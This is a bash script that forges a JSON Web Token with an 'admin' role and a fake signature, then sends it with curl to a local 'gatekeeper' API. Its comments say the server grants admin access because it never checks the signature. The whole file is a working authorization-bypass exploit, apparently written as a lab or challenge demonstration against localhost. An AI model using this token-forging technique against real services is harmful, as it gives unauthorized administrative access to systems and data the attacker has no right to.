#!/usr/bin/env bash
#
# Forges an admin token and sends it to the gatekeeper API.
#
# We do NOT know the server's signing secret, so we cannot produce a valid
# signature. We build the token by hand with the role we want and a fake
# signature. The server never checks the signature, so it grants admin.
set -euo pipefail

API="http://127.0.0.1:8080/account"

# base64url encode stdin (works on both GNU and BSD base64)
b64url() { base64 | tr -d '\n' | tr '+/' '-_' | tr -d '='; }

HEADER='{"alg":"HS256","typ":"JWT"}'
PAYLOAD='{"sub":"mallory","role":"admin"}'

h=$(printf '%s' "$HEADER"  | b64url)
p=$(printf '%s' "$PAYLOAD" | b64url)
sig="this-signature-is-completely-fake"

token="$h.$p.$sig"

echo "==> forged token (admin role, and a fake signature we made up):"
echo "$token"
echo
echo "==> calling $API with the forged token"
curl -s -H "Authorization: Bearer $token" "$API"
echo
echo "==> We never knew the signing key, yet the server granted admin access."
